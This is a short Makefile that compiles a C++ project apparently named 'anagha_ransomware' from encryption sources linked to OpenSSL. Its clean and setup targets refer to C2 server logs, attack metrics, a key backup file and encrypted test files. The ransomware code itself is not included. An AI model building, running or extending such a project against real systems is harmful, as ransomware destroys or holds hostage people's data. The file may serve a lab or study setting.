CXX = g++
CXXFLAGS = -std=c++17 -Wall -O2 -pthread
LDFLAGS = -lssl -lcrypto -pthread

TARGET = anagha_ransomware
SOURCES = src/main.cpp src/encryption.cpp

all: $(TARGET)

$(TARGET): $(SOURCES)
	@$(CXX) $(CXXFLAGS) -o $(TARGET) $(SOURCES) $(LDFLAGS)
	@echo "Build complete."

clean:
	@rm -f $(TARGET) c2_server.log session_history.log attack_metrics.log
	@rm -f system_restore.log temp_key_backup.key
	@rm -f test_files/*.encrypted
	@echo "Clean complete."

setup:
	@mkdir -p test_files
	@echo "print('script')" > test_files/code.py
	@echo "int main(){}" > test_files/program.cpp
	@echo "Setup complete with realistic files."

run: $(TARGET)
	@./$(TARGET)

.PHONY: all clean setup run
